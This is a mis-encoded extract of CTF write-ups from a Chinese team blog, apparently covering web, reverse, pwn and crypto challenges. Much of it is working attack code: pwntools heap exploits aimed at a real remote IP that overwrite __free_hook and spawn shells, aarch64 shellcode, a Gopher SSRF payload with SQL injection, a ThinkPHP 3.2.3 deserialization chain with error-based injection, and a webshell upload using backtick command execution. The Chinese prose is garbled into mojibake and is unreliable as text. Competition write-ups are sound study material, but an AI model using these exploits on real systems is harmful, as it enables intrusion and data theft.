\nä½†æ˜¯ç™»é™†åéœ€è¦çŒœè§£ï¼Œæ˜¯admin\n# python3 # wh1sper from urllib.parse import quote #username = \u0026#34;1\u0026#39;;rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;\u0026#34; #username = \u0026#34;1\u0026#34; username = \u0026#34;admin\u0026#34;#admin_inner/5fb4e07de914cfc82afb44vbaf402203d #æˆ‘è‰æ³¥é©¬çš„è„‘ç˜«é¢˜ password = \u0026#34;5fb4e07de914cfc82afb44vbaf402203\u0026#34;#fake_admin/fake_passwor post_data = \u0026#34;username={}\u0026amp;password={}\u0026#34;.format(quote(username), quote(password)) cl = len(post_data) stream = \u0026#34;\u0026#34;\u0026#34;POST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: {} Cookie: PHPSESSID=fuj95a6eo7sa84923b6eg5bie2; path=/ {} \u0026#34;\u0026#34;\u0026#34;.format(cl, post_data).replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) # POSTå‚æ•°å…ˆç¼–ç ä¸€æ¬¡ host = \u0026#34;gopher://127.0.0.1:80/\u0026#34; print(host+\u0026#39;_\u0026#39;+quote(stream)) # Gopheræ•°æ®æµå†ç¼–ç ä¸€æ¬¡ #print(stream) æ„é€ Gopheræ•°æ®ï¼Œå…ˆæ‰“admin.phpï¼Œå¾—åˆ°Cookieä¹‹åå¸¦ç€Cookieæ‰“flag.phpå°±èƒ½æ‹¿åˆ°flagã€‚\nReverse GoEncrypt è¾“å…¥ç¬¦åˆæ­£åˆ™æ ¼å¼çš„flag:flag{11111111-1111-1111-1111-111111111111}, é™¤äº†â€-â€œçš„å…¶ä»–hexç¼–ç  ï¼Œä¹‹ååˆ†æˆ2ç»„ xtea,è„šæœ¬\næŠ„ç™¾åº¦å°±è¡Œ\n#include\u0026lt;stdio.h\u0026gt;#include\u0026lt;stdlib.h\u0026gt;#define uint32_t unsigned int void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x12345678; for (i = 0; i \u0026lt; num_rounds; i++) { v0 += (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); sum += delta; v1 += (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum \u0026gt;\u0026gt; 11) \u0026amp; 3]); } v[0] = v0; v[1] = v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x12345678, sum = delta * num_rounds; for (i = 0; i \u0026lt; num_rounds; i++) { v1 -= (((v0 \u0026lt;\u0026lt; 4) ^ (v0 \u0026gt;\u0026gt; 5)) + v0) ^ (sum + key[(sum \u0026gt;\u0026gt; 11) \u0026amp; 3]); sum -= delta; v0 -= (((v1 \u0026lt;\u0026lt; 4) ^ (v1 \u0026gt;\u0026gt; 5)) + v1) ^ (sum + key[sum \u0026amp; 3]); } v[0] = v0; v[1] = v1; } int main() { uint32_t v[2] = { 0xedf5d910,0x542702cb};//è¿˜æœ‰ä¸€ç»„å¯¹ç…§çš„ æ”¹ä¸€ä¸‹å°±è¡Œ  uint32_t const k[4] = { 0x10203,0x4050607,0x8090a0b,0xc0d0e0f }; unsigned int r = 32;//num_roundså»ºè®®å–å€¼ä¸º32  // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°  // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½  printf(\u0026#34;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š0x%x 0x%x\\n\u0026#34;, v[0], v[1]); printf(\u0026#34;åŠ å¯†åçš„æ•°æ®ï¼š0x%x 0x%x\\n\u0026#34;, v[0], v[1]); decipher(r, v, k); printf(\u0026#34;è§£å¯†åçš„æ•°æ®ï¼š0x%x 0x%x\\n\u0026#34;, v[0], v[1]); return 0; } Crackme è¾“å…¥17ä¸ªå­—ç¬¦åˆ†æˆ7å’Œ10ï¼Œåˆè¾“å…¥ä¸€ä¸ªæ•°è¦æ»¡è¶³\nçˆ†ç ´å°±è¡Œ\n//ä¸€ä¸ªé™¤ ä¸€ä¸ª% #include\u0026lt;math.h\u0026gt;#include\u0026lt;iostream\u0026gt;#include\u0026lt;stdio.h\u0026gt;using namespace std; double nmsl(double a, double b) { double tmp = pow(a,b-1.0); double ret = tmp / exp(a); return ret; } int main() { double v20 = 0.0; double v15 = 0.0; for (int i = 0; i \u0026lt; 12379; ++i) { v20 = 0.0; v15 = 0.0; do { v15 = v15 + nmsl(v20, (double)i) * 0.001; v20 = v20 + 0.001; } while (v20 \u0026lt;= 100.0); int total = (int)(v15 + v15 + 3.0); if(total == 0x5a2)//total == 0x13b03 \tprintf(\u0026#34;i == %d , x== 0x%x\\n\u0026#34;,i,total); } } //99038 å‰7ä¸ªå’Œ 99038ç”Ÿæˆçš„æ•°ç»„xor ,åé¢10ä¸ª rc4,æ€»çš„æ¥è¯´éƒ½æ˜¯xor ï¼Œæ‰¾åˆ°è¦xorçš„æ•°å°±è¡Œ\n\u0026gt;\u0026gt; \u0026gt; a = \u0026quot;9903819\u0026quot;\r\u0026gt;\u0026gt; \u0026gt; x = [0x8, 0x4d, 0x59, 0x06, 0x73, 0x02, 0x40]\r\u0026gt;\u0026gt; \u0026gt; c = \u0026quot;\u0026quot;\r\u0026gt;\u0026gt; \u0026gt; for i in range(7) :\r... c += chr(ord(a[i]) ^ x[i])\r...\r\u0026gt;\u0026gt; \u0026gt; c\r'1ti5K3y'\r\u0026gt;\u0026gt; \u0026gt; s = [0xb2, 0xd6, 0x8e, 0x3f, 0xaa, 0x14, 0x53, 0x54, 0xc6, 0x06]\r\u0026gt;\u0026gt; \u0026gt; key = [0xe0, 0x95, 0xba, 0x60, 0xc9, 0x66, 0x2a, 0x24, 0xb2, 0x36]\r\u0026gt;\u0026gt; \u0026gt; d = \u0026quot;\u0026quot;\r\u0026gt;\u0026gt; \u0026gt; for i in range(10) :\r... d += chr(s[i] ^ key[i])\r...\r\u0026gt;\u0026gt; \u0026gt; c + d\r'1ti5K3yRC4_crypt0'\r\u0026gt;\u0026gt; \u0026gt;\rPwn apollo #coding=utf-8 from pwn import* #context.log_level = \u0026#39;DEBUG\u0026#39; \u0026#39;\u0026#39;\u0026#39; func_table:\t[0x14018 + proc_base] opcode_table: [0x13FE8 + proc_base] 0x0: 0x4D-\u0026gt; calloc(location,1); calloc(timeS,1); opcode +=3; 0x1: 0x2A-\u0026gt;add;just one times; p8(index0) + p8(index1)+p16(Size); opcode+=5 0x2: 0x2F-\u0026gt; free(); p8(index0) + p8(index1); opcode+=3 0x3: 0x2B-\u0026gt; Set the Location; p8(index0) + p8(index1) + p8(Location); opcode+=4 1 \u0026lt; Size \u0026lt;= 4; 0x4: 0x2D-\u0026gt; Set the Location into 0; p8(index0) + p8(index1); opcode +=3 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0x5: 0x77-\u0026gt; opcode++; Up -\u0026gt;2ã€3-\u0026gt;2; or 0-\u0026gt;1; 0x6: 0x73-\u0026gt; opcode++; Down -\u0026gt;2ã€3-\u0026gt;2; or 0-\u0026gt;1; 0x7: 0x61-\u0026gt; opcode++; Left -\u0026gt;2ã€3-\u0026gt;2; or 0-\u0026gt;1; 0x8: 0x64-\u0026gt; opcode++; Right-\u0026gt;2ã€3-\u0026gt;2; or 0-\u0026gt;1; 0x9: 0x70-\u0026gt; show;opcode++; 0xA: 0x00-\u0026gt;Exit 0xB: 0x01-\u0026gt;default;opcode++; \u0026#39;\u0026#39;\u0026#39; #p = process([\u0026#39;qemu-aarch64\u0026#39;,\u0026#39;-g\u0026#39;,\u0026#39;5555\u0026#39;,\u0026#39;-L\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;./main\u0026#39;]) libc = ELF(\u0026#39;./libc-2.27.so\u0026#39;) p = remote(\u0026#39;8.140.179.11\u0026#39;,13422) payload = \u0026#39;\\x4D\\x10\\x10\u0026#39; #init_All_Var payload += \u0026#39;\\x2A\\x00\\x04\\xF0\\x04\u0026#39; # Add 0 payload += \u0026#39;\\x2A\\x00\\x05\\x10\\x00\u0026#39; # Add 1 payload += \u0026#39;\\x2F\\x00\\x04\u0026#39; #delete 0 payload += \u0026#39;\\x2A\\x00\\x04\\xF0\\x00\u0026#39; # Add 0 payload += \u0026#39;\\x70\u0026#39; payload += \u0026#39;\\x73\u0026#39;*0xE payload += \u0026#39;\\x64\\x61\u0026#39;*0x36 payload += \u0026#39;\\x64\u0026#39;*6 payload += \u0026#39;\\x2B\\x0E\\x07\\x03\u0026#39; payload += \u0026#39;\\x64\u0026#39; payload += \u0026#39;\\x2B\\x0F\\x08\\x03\u0026#39; payload += \u0026#39;\\x73\u0026#39; payload += \u0026#39;\\x2A\\x00\\x06\\x70\\x00\u0026#39; # Add 2 payload += \u0026#39;\\x2A\\x00\\x07\\x70\\x03\u0026#39; # Add 3 payload += \u0026#39;\\x2F\\x00\\x06\u0026#39; # delete 2 payload += \u0026#39;\\x2F\\x00\\x04\u0026#39; # delete 0 payload += \u0026#39;\\x2A\\x00\\x04\\x70\\x01\u0026#39; # Add 0 payload += \u0026#39;\\x2A\\x00\\x06\\x70\\x00\u0026#39; # Add 2 payload += \u0026#39;\\x2A\\x00\\x08\\x70\\x00\u0026#39; # Add free_hook payload += \u0026#39;\\x2F\\x00\\x06\u0026#39; # delete 2 payload += \u0026#39;\\x00\u0026#39; p.sendlineafter(\u0026#39;cmd\u0026gt; \u0026#39;,payload) sleep(0.1) p.sendline(\u0026#39;FMYY\u0026#39;) sleep(0.1) p.sendline(\u0026#39;FMYY\u0026#39;) sleep(0.1) p.send(\u0026#39;\\x10\u0026#39;) p.recvuntil(\u0026#39;pos:0,4\\n\u0026#39;) libc_base = (u64(p.recvuntil(\u0026#39;\\n\u0026#39;,drop=True).ljust(8,\u0026#39;\\x00\u0026#39;)) | 0x4000000000) - 0xF10 - 0x154000 log.info(\u0026#39;LIBC:\\t\u0026#39; + hex(libc_base)) log.info(\u0026#39;__malloc_Hook:\\t\u0026#39; + hex(libc_base + libc.sym[\u0026#39;__malloc_hook\u0026#39;])) system = libc_base + libc.sym[\u0026#39;system\u0026#39;] free_hook = libc_base + libc.sym[\u0026#39;__free_hook\u0026#39;] log.info(\u0026#39;__free_hook:\\t\u0026#39; + hex(free_hook)) p.sendline(\u0026#39;FMYY\u0026#39;) sleep(0.1) p.sendline(\u0026#39;FMYY\u0026#39;) sleep(0.1) p.sendline(\u0026#39;\\x00\u0026#39;*0x100 + p64(free_hook)) sleep(0.1) p.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) sleep(0.1) p.sendline(p64(system)) sleep(0.1) p.interactive() quite #coding=utf-8 from pwn import* \u0026#39;\u0026#39;\u0026#39; X22: 0x100000000000 X21: OPCode_Memory N:0 Index:0x28; X22 --;opcode+=1 N:1\tIndex:0x29; X22 ++;opcode+=1 N:2\tIndex:0x2A; [X22]++;opcode+=1; N:3\tIndex:0x2F; [X22]--;opcode+=1; N:4\tIndex:0x40; _IO_putc(X22);opcode+=1; N:5\tIndex:0x23; _IO_getc(X22);opcode+=1; N:6\tIndex:0x5B; N:7\tIndex:0x5D; N:8\tIndex:0x00; N:9\tIndex:0x47; Call 0x100000000000 N:A Index:0x01; Default; \u0026#39;\u0026#39;\u0026#39; #p = process([\u0026#39;qemu-aarch64\u0026#39;,\u0026#39;-g\u0026#39;,\u0026#39;6666\u0026#39;,\u0026#39;-L\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;./main\u0026#39;]) p = remote(\u0026#39;8.140.179.11\u0026#39;,51322) shellcode = \u0026#39;\\xE1\\x45\\x8C\\xD2\\x21\\xCD\\xAD\\xF2\\xE1\\x65\\xCE\\xF2\\x01\\x0D\\xE0\\xF2\\xE1\\x8F\\x1F\\xF8\\xE1\\x03\\x1F\\xAA\\xE2\\x03\\x1F\\xAA\\xE0\\x63\\x21\\x8B\\xA8\\x1B\\x80\\xD2\\xE1\\x66\\x02\\xD4\u0026#39; p.send(\u0026#39;\\x23\\x29\u0026#39;*len(shellcode) + \u0026#39;\\x47\u0026#39;) sleep(0.5) p.send(shellcode) p.interactive() Crypto simultaneous å®¡è®¡ä»£ç ï¼Œå‘ç°xå’Œyå¤§å°å‡çº¦ä¸º381bitï¼Œzçº¦ä¸º631bitï¼Œeå’ŒNä¸º1024bitã€‚ é¦–å…ˆå‘ç°xå¾ˆå°ä¸”ä¸‰æ¬¡åŠ å¯†æ—¶æ‰€ç”¨çš„xç›¸åŒï¼Œè€Œex-yN=y*(p+q+1)-z_åªæœ‰çº¦893bitï¼Œä¸eå’ŒNç›¸æ¯”éƒ½å¾ˆå°ï¼Œæ‰€ä»¥æ„é€ æ ¼å­è¿›è¡Œæ ¼åŸºè§„çº¦ï¼š sage: A = matrix(ZZ,4,[2**512,0,0,0,e1,-n1,0,0,e2,0,-n2,0,e3,0,0,-n3]) sage: B = A.transpose() sage: C = B.LLL() sage: C[0] (8866336715717388426172963523471330954077188809904909656840498650956244748060448654334827362938608283011460454932611722549140899975837332516255422319218997339352725870280417222934472617692234368327945625080892989434758573490606357931772643305970422681049000558333001728, 23565804679746565933710388872729524528226359415562140615287656018817455800535466780287799003178367701822507942125498993654311133503025992126025046704035560696109076086415547740763302445007651443569886959741145900119997240641197056821966126478523677707529102803982641184, 108960871214576793022207296445632894090843538519696872165557959140648817747262325676571075528643507778206273055515718254598755429648600953278539486434738401784633970948810856056270409547951407224850758488218814477712938397264786375512963038875176200582202541244988064762, 104724522928227808113699830194721186205703616771719604100697952234782584810976846111816114359575185225135299113577201578471709313075817367107222881505195506424821820424051124267603014862466153889752001180168723756986189763744130308518039129969039000165646079670467289202) sage: x = C[0][0]\u0026raquo;512 sage: x 661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143 sage: isPrime(x) 1 æ„é€ å¦‚ä¸Šæ‰€è¿°çš„æ ¼å­ï¼Œå¯ä»¥ä»æ ¼åŸºè§„çº¦çš„ç»“æœä¸­å¿«é€Ÿå¾—åˆ°xã€‚ å¾—åˆ°xä¹‹åï¼Œä»ç„¶æ ¹æ®e*x-y*N=y*(p+q+1)-z_\u0026lt;Nï¼Œå¾—åˆ°y=e*x//Nï¼Œæ‰€ä»¥ä¸‰æ¬¡çš„yéƒ½å¯ä»¥ç”¨è¿™ä¸ªç­‰å¼æ±‚å‡ºæ¥ã€‚ sage: y3 = e3*x//n3 sage: isPrime(y3) 1 sage: y2 = e2*x//n2 sage: isPrime(y2) 1 sage: y1 = e1*x//n1 sage: isPrime(y1) 1 xã€yéƒ½çŸ¥é“äº†ï¼Œæ‰€ä»¥ä½™æ•°k=y*(p+q+1)-z_ä¹Ÿå¯ä»¥ç›¸åº”åœ°æ±‚å‡º sage: k3 = e3*x-y3*n3 sage: k2 = e2*x-y2*n2 sage: k1 = e1*x-y1*n1 åˆ†æä½™é¡¹kçš„ç»“æ„ï¼š k = y*(p+q+1)-z_ = y*(p+q+1) - zbound - ((p + 1)*(q + 1)*y - zbound) % x = y*(p+q+1) + int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) - ((p + 1)*(q + 1)*y - zbound) % x\nåœ¨è¿™ä¸ªå¼å­ä¸­ï¼Œç¬¬ä¸‰é¡¹((p + 1)*(q + 1)y - zbound) % xï¼Œæ˜¯å¯¹xå–å¾—çš„ä½™æ•°ï¼Œæ‰€ä»¥å®ƒè‚¯å®šæ˜¯ä¸€ä¸ªå°äºxçš„éè´Ÿæ•°ï¼›è€Œç¬¬äºŒé¡¹ int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q)))çš„å€¼ä¸å®æ•°((p-q) * round(n ** 0.25) * y) / (3 * (p + q))çš„å·®ä¸è¶…è¿‡å¸¸æ•°1ã€‚æ‰€ä»¥å¯ä»¥å¾—åˆ°k - y(p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q)))çš„ç»å¯¹å€¼æ˜¯ä¸ä¼šè¶…è¿‡x+yçš„ã€‚è€Œ(x+y)//yæ˜¯å¾ˆå°å¾ˆå°çš„ï¼Œæ‰€ä»¥å¯ä»¥æš‚æ—¶å¿½ç•¥ä¸è®¡ã€‚\næ‰€ä»¥ä»¤K = k//yï¼Œåˆ™å‡ ä¹å¯ä»¥è®¤ä¸ºK=p+q+1+((p-q) * round(n ** 0.25)) / (3 * (p + q))ã€‚ è¿™é‡Œround(n ** 0.25)å·²çŸ¥ï¼ŒæœªçŸ¥é‡åªæœ‰p-qå’Œp+qã€‚ å¯¹æ•´ä¸ªç­‰å¼è¿›è¡Œç®€å•çš„å˜å½¢åå¯ä»¥å¾—åˆ°ç”¨å«p+qçš„å¼å­è¡¨ç¤ºp-qï¼š p - q = 3 * (p + q) * (K-1-(p+q)) / round(n ** 0.25) è€Œæ ¹æ®å¹³æ–¹å·®å…¬å¼ï¼Œ(p+q)^2 - (p-q)^2 = 4pq = 4n æ‰€ä»¥ä»¤p+q=sï¼Œåˆ™ä¸Šå¼å¯åŒ–ä¸ºss-int(9ss(K-1-s)(K-1-s))/(round(n^0.25))^2 = 4nã€‚ è€Œè¿™ä¸ªæ–¹ç¨‹å¯ä»¥ç”¨äºŒåˆ†æ³•æ±‚å…¶è¿‘ä¼¼æ•´æ•°è§£ï¼Œç„¶åç¨å¾®æ ¹æ®å¥‡å¶æ€§åšç‚¹ç›¸åº”çš„ä¿®æ­£ã€‚ sage: def magic(K,N): \u0026hellip;.: l = 0 \u0026hellip;.: r = K \u0026hellip;.: for i in range(515): \u0026hellip;.: s = (l+r)//2 \u0026hellip;.: v = ss-int(ss9*(K-1-s)*(K-1-s))//(round(N^0.25)*round(N^0.25)) \u0026hellip;.: if(v\u0026lt;4*N): \u0026hellip;.: l = s \u0026hellip;.: else: \u0026hellip;.: r = s \u0026hellip;.: return r \u0026hellip;.: sage: s3 = magic(K3,n3) sage: s2 = magic(K2,n2) sage: s1 = magic(K1,n1) sage: s3 18459018640955512832829048105711364903415072505002892754520813962752576865824290315357137127800833228562342513337961044655924159981814783588968959511015508 sage: s2 19511198066679441661645179970610060853694402093688175864187492448475141832783517018527146512367573855149291232173039125664151037907250865382648639649226905 sage: s2 = s2+1 sage: s1 19094603811148743548404150847713419121365563250591127608146415278074868880338697379102160497997619208075125156916806494003926028149361835606603268896884014\nä¸‰ä¸ªp+qéƒ½æ±‚å‡ºæ¥ä¹‹åï¼Œå°±å¯ä»¥è·å–ç§é’¥dï¼Œæ­£å¸¸è§£å¯†å¾—åˆ°flagã€‚\nsage: d1 = inverse(e1,n1+s1+1) sage: d2 = inverse(e2,n2+s2+1) sage: d3 = inverse(e3,n3+s3+1) sage: def decrypt(c, d, n): \u0026hellip;.: n = int(n) \u0026hellip;.: size = n.bit_length() // 2 \u0026hellip;.: \u0026hellip;.: c_high, c_low = c \u0026hellip;.: b = (c_low2 - c_high3) % n \u0026hellip;.: EC = EllipticCurve(Zmod(n), [0, b]) \u0026hellip;.: m_high, m_low = (EC((c_high, c_low)) * d).xy() \u0026hellip;.: m_high, m_low = int(m_high), int(m_low) \u0026hellip;.: \u0026hellip;.: return (m_high \u0026laquo; size) | m_low \u0026hellip;.: sage: m1 = decrypt(c1,d1,n1) sage: m2 = decrypt(c2,d2,n2) sage: m3 = decrypt(c3,d3,n3) sage: long_to_bytes(m0^^m1^^m2^^m3) b\u0026rsquo;flag{b4dd980a-cd0b-422a-bbee-e9005e1c6380}'\n","date":"2021-04-04T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png","permalink":"https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/","title":"è™ç¬¦CTF Writeup by X1cT34m"},{"content":"Misc ç­¾åˆ° BPæŠ“åŒ…çˆ†ç ´\nCrypto RSA attack å¼€ä¸‰æ¬¡æ–¹æ ¹å°±æœ‰äº†\nfrom gmpy2 import iroot from Crypto.Util.number import * p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031 p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034 n=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793 c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413 e = 1+1+1 for k in range(1000): if iroot(c+k*n,3)[1]==True: m=iroot(c+k*n,3)[0] break flag=long_to_bytes(m) print(flag) Reverse go è°ƒæ¢é¡ºåº ï¼Œbase58æ²¡äº†\nimport base58 text= b\u0026#34;2GVdudkYo2CBXoQii7gfpkjTc4gT\u0026#34; plaintext = \u0026#34;\u0026#34; table1 = b\u0026#34;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345\u0026#34; table2 = b\u0026#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#34; for i in range(len(text)): for j in range(len(table1)): if(text[i]==table1[j]): plaintext += chr(table2[j]) break print(plaintext) print(base58.b58decode(plaintext.encode())) flag{We1CTFc0m_2345} é¡ºåºæ‰‹åŠ¨è°ƒæ¢\nPwn åŒè¾¹åè®®1.0 from pwn import* import base64 #context.log_level = \u0026#39;DEBUG\u0026#39; def get_argv(recv_string,string): #gdb.attach(p,\u0026#34;b *(0x555555554000+0x1348)\u0026#34;) p.sendafter(recv_string,base64.b64encode(p32(0x12345678)*2 + p64(0x30) + p64(8) + p64(0x8) + \u0026#39;A\u0026#39;*8 + string)) def Create(size,content): get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;1\u0026#39;) get_argv(\u0026#39;emUgPj4=\u0026#39;,str(size)) get_argv(\u0026#39;bnQgPj4=\u0026#39;,content) def Free(): get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;2\u0026#39;) def Edit(content): get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;3\u0026#39;) get_argv(\u0026#39;bnQgPj4=\u0026#39;,content) def View(): get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;4\u0026#39;) p = process(\u0026#39;./main\u0026#39;) libc =ELF(\u0026#39;./libc-2.23.so\u0026#39;) p = remote(\u0026#39;8.140.179.11\u0026#39;,13452) Create(0x20,\u0026#39;FMYY\u0026#39;) get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;1\u0026#39;) get_argv(\u0026#39;emUgPj4=\u0026#39;,str(0x1000)) get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;3\u0026#39;) #gdb.attach(p,\u0026#34;b *(0x555555554000+0xD10)\u0026#34;) payload = \u0026#39;\\x00\u0026#39;*0x28 + p64(0x3A1) + \u0026#39;\\x00\u0026#39;*0x378 + p64(0x21) + \u0026#39;\\x00\u0026#39;*0x18 + p64(0x791) + \u0026#39;\\x00\u0026#39;*0x788 + p64(0x781) p.sendafter(\u0026#39;bnQgPj4=\u0026#39;,base64.b64encode(p32(0x12345678)*2 + p64(0xF30) + p64(8) + p64(0xF08) + \u0026#39;A\u0026#39;*8 + payload)) Create(0x20,\u0026#39;\\x78\u0026#39;) View() p.recvline() data = base64.b64decode(p.recvline()) libc_base = u64(data[-6:].ljust(8,\u0026#39;\\x00\u0026#39;)) - libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x68 #+ 0x100000000 log.info(\u0026#39;LIBC:\\t\u0026#39; + hex(libc_base)) Create(0x10,\u0026#39;\\x10\u0026#39;) View() p.recvline() data = base64.b64decode(p.recvline()) heap_base = u64(data[-6:].ljust(8,\u0026#39;\\x00\u0026#39;)) - 0xA10 log.info(\u0026#39;HEAP:\\t\u0026#39; + hex(heap_base)) get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;3\u0026#39;) p.sendafter(\u0026#39;bnQgPj4=\u0026#39;,base64.b64encode(p32(0x12345678)*2 + p64(0) + p64(0x68) + p64(0x68) + \u0026#39;A\u0026#39;*8 + \u0026#39;FMYY\u0026#39; + \u0026#39;\\n\u0026#39;)) Create(0x60,p64(libc_base + libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23)) Create(0x60,\u0026#39;FMYY\u0026#39;) Create(0x60,\u0026#39;FMYY\u0026#39;) Create(0x60,\u0026#39;FMYY\u0026#39;) get_argv(\u0026#39;Pg==\u0026#39;,\u0026#39;3\u0026#39;) p.sendafter(\u0026#39;bnQgPj4=\u0026#39;,base64.b64encode(p32(0x12345678)*2 + p64(0x50) + p64(0x8) + p64(0x28) + \u0026#39;A\u0026#39;*8 + \u0026#39;\\x00\u0026#39;*0x13 + p64(libc_base + 0xF1207) + \u0026#39;\\n\u0026#39;)) p.interactive() Web write_shell ?action=pwd å¾—åˆ°å­˜å‚¨è·¯å¾„\n?action=upload\u0026amp;data=\u0026lt;?=`rev%09/*gggg*`?\u0026gt;å¾—åˆ°ç»“æœé€†è½¬ä¸€ä¸‹å°±è¡Œ\neasytp æ‰«ç›®å½•å¾—åˆ°www.zip\nçœ‹åˆ°æ˜¯ThinkPHP 3.2.3\n/home/indexæœ‰ååºåˆ—åŒ–ï¼š\nä¸æºç diffä¸€ä¸‹ï¼Œçœ‹åˆ°æ”¹äº†Library\\Think\\Db\\Driver.class.php\nçŒœæµ‹æœ‰mysqlï¼Œè®°å¾—tp3.2.3æœ‰ååºåˆ—åŒ–æ‰“æ•°æ®åº“ç±»çš„é“¾ï¼šhttps://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA\nå°è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»\næ²¡è¯»åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼ŒçŒœæµ‹æ•°æ®åº“å¯†ç 123456\nç„¶åå¯ä»¥æŠ¥é”™æ³¨å…¥\npoc:\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶  ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;mysql\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;3306\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;123456\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,substr((select f14g from tp.f14g),32,64),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); } pocä¸­æŸ¥åº“æŸ¥è¡¨è¯­å¥å¦‚ä¸‹ï¼š\nupdatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;tp\u0026#39;),1,32),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;f14g\u0026#39;),1,32),0x7e),1) 